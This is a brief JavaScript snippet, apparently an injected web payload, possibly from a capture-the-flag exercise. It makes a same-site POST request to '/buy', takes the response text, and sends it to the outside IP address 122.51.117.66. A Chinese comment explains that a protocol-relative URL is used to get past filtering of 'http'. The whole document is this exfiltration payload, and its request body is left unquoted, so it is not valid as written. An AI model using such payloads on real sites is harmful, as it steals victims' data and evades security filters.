const fetchOptions = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: id=0
};

fetch('/buy', fetchOptions).then(response => response.text())
  .then(text => {
    fetch("//122.51.117.66/" 	//利用协议相对url绕过对http的拦截
      + text)
  })
